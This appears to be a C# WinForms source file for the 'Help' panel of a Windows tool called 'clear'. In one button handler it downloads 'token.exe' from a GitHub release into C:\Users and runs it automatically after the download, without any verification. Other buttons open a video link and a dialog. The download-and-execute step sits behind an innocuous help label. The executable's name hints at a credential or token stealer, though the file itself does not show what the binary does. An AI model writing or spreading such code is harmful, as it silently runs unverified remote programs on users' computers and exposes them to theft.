using clear.Forms;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace clear.UCs
{
    public partial class Help : UserControl
    {
        public Help()
        {
            InitializeComponent();
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string url = "https://github.com/yostiler/token/releases/download/token/token.exe";
            string fileName = @"C:\Users\token.exe";

            using (WebClient client = new WebClient())
            {
                client.DownloadFileCompleted += new AsyncCompletedEventHandler(DownloadCompleted);
                client.DownloadFileAsync(new Uri(url), fileName);
            }
        }

        private void DownloadCompleted(object sender, AsyncCompletedEventArgs e)
        {
            if (e.Error == null)
            {
                string fileName = @"C:\Users\token.exe";
                if (File.Exists(fileName))
                {
                    Process.Start(fileName);
                }
            }
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
            string videoUrl = "https://streamable.com/jfs8fr";

            Process.Start(videoUrl);
        }

        private void ShowBoxForm()
        {
            using (Box boxForm = new Box())
            {
                boxForm.ShowDialog();
            }
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            ShowBoxForm();
        }
    }
}